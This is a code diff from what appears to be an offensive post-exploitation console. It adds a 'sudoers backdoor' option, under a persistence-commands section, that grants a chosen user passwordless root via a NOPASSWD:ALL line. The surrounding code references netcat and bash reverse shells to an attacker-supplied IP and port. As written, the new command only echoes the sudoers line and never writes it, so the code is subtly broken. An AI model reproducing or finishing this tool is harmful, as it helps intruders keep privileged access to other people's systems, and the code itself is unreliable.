@@ -141,7 +141,14 @@ nc {ip} {port} - will attempt to setup a reverse netcat shell on that specific p
                 revCommand = str(revCommand).split()
             if revCommand[0] == 'bash':
                 print('Attempting to create bash reverse shell to ' + revCommand[1] + 'on port ' + revCommand[2] + '...')
-            
+        
+        if str(backCommand) == 'sudo':
+            print('What user would you like to have sudo privileges?')
+            sudoCommand = input('\033[1;31;40m' + user + '\033[0m' + '\033[1;34;40m@Kh0p3sh-console\033[0m' + '\033[1;34;40m' + '/' + 'backdoor-console\033[0m' + '\033[1;34;40m' + '/' + 'sudo\033[0m' + '>')
+            try:
+                os.system('echo "' + sudoCommand + ' ALL=(ALL) NOPASSWD:ALL"')
+            except: print('There was an error attempting to create a sudoers backdoor!')
+
 #################END OF PERSISTENCE COMMANDS##################
 
     else:
